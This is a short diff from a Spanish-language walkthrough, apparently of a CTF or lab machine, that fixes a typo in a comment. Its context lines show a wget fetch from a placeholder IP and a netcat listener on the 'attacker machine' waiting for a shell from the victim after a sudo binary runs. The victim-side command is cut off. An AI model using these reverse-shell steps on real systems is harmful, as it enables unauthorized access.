@@ -132,7 +132,7 @@ wget http://<IP>/image.jpg
 Una ves que se transfirió la imagen, abrís otra terminal para ponerte en escucha con `netcat` por el puerto especificado, ejecutas con sudo el binario:
 
 ```bash
-#máquina atacnte 
+#máquina atacante 
 nc -nlvp <puerto_especificado>
 
 #máquina víctima
